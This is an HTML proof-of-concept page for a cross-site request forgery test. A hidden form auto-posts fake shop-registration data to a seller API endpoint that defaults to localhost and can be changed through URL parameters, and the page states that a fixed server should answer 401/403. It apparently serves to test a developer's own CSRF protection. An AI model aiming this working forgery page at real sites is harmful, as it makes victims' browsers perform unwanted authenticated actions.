<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Demo (Form Submit)</title>
    <style>
        body {
            font-family: "Segoe UI", Tahoma, sans-serif;
            background: #f6f7fb;
            color: #1f2937;
            margin: 0;
            padding: 24px;
        }
        .card {
            max-width: 760px;
            margin: 0 auto;
            background: #fff;
            border: 1px solid #e5e7eb;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06);
        }
        h1 {
            margin-top: 0;
            color: #b91c1c;
        }
        .muted {
            color: #6b7280;
            font-size: 14px;
        }
        .row {
            margin: 10px 0;
            font-size: 14px;
        }
        .code {
            display: inline-block;
            background: #f3f4f6;
            border: 1px solid #e5e7eb;
            border-radius: 6px;
            padding: 2px 8px;
            font-family: Consolas, monospace;
            font-size: 13px;
        }
        button {
            margin-top: 12px;
            border: 0;
            border-radius: 10px;
            padding: 12px 18px;
            background: #dc2626;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
        }
        .result {
            margin-top: 14px;
            padding: 12px;
            border-radius: 8px;
            background: #fff7ed;
            border: 1px solid #fdba74;
            font-size: 14px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>CSRF PoC (separate file)</h1>
    <p class="muted">
        This file sends a cross-site POST to register-shop by hidden form submit (no fetch, no CORS readback).
    </p>

    <div class="row">Target origin: <span id="targetOrigin" class="code"></span></div>
    <div class="row">Target path: <span id="targetPath" class="code"></span></div>

    <button id="attackBtn" type="button">Run CSRF Form Submit</button>

    <div id="result" class="result" style="display:none"></div>

    <iframe name="csrf-target" style="display:none"></iframe>
    <form id="csrfForm" method="POST" target="csrf-target" style="display:none">
        <input type="hidden" name="name" value="CSRF_HACKED_SHOP">
        <input type="hidden" name="address" value="123 Evil Street">
        <input type="hidden" name="description" value="Shop created by CSRF demo">
    </form>
</div>

<script>
(function () {
    var params = new URLSearchParams(window.location.search);
    var target = params.get("target") || "https://localhost:8443";
    var path = params.get("path") || "/api/seller/register-shop";

    target = target.replace(/\/$/, "");
    if (!path.startsWith("/")) {
        path = "/" + path;
    }

    document.getElementById("targetOrigin").textContent = target;
    document.getElementById("targetPath").textContent = path;

    var form = document.getElementById("csrfForm");
    form.action = target + path;

    document.getElementById("attackBtn").addEventListener("click", function () {
        form.submit();

        var result = document.getElementById("result");
        result.style.display = "block";
        result.innerHTML =
            "Form submitted to <span class='code'>" + form.action + "</span>.<br>" +
            "Payload: name/address/description for register-shop.<br>" +
            "Open DevTools Network to inspect request cookies and status code.<br>" +
            "Expected after fix: 401/403 (blocked), not 200.";
    });
})();
</script>
</body>
</html>
